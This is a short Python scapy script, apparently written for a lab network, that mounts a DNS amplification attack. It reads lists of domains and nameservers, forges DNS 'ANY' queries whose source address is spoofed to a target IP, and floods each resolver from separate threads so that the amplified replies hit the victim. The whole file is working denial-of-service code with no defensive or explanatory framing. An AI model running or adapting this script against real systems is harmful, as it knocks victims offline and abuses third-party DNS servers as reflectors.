# !/usr/bin/env python


import logging
import threading
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import UDP, IP

target = '172.29.0.3'  # Target host
# nameserver = "172.20.0.2"  # DNS server
# domain = "google.com"  # Some domain name like "google.com" etc.

# request_count = 10  # times of request


def filereader(file):
    with open(file, "r") as pointer:
        file_list = pointer.read()
        data = file_list.split()
    return data

domains = filereader('DOMAINS.txt')
nameservers = filereader('SERVERS.txt')

def build(domain, nameserver):
    ip = IP(src=target, dst=nameserver)
    udp = UDP(dport=53)
    dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))
    print(type(dns))
    request = (ip/udp/dns)
    print('LOG2', request, dns, type(request))
    return request


def thread_function(nameserver):
    for domain in domains:
        print(f"LOG: ", domain, nameserver)
        request = build(domain, nameserver)
        print('LOG3:', request)
        send(request)


if __name__ == "__main__":
    # format = "%(asctime)s: %(message)s"
    # logging.basicConfig(format=format, level=logging.INFO,
    #                     datefmt="%H:%M:%S")



    threads = list()
    for nameserver in nameservers:
        # logging.info("Main    : create and start thread %d.", nameserver)
        x = threading.Thread(target=thread_function, args=(nameserver,))
        threads.append(x)
        x.start()

    for index, thread in enumerate(threads):
        # logging.info("Main    : before joining thread %d.", index)
        thread.join()
        # logging.info("Main    : thread %d done", index)
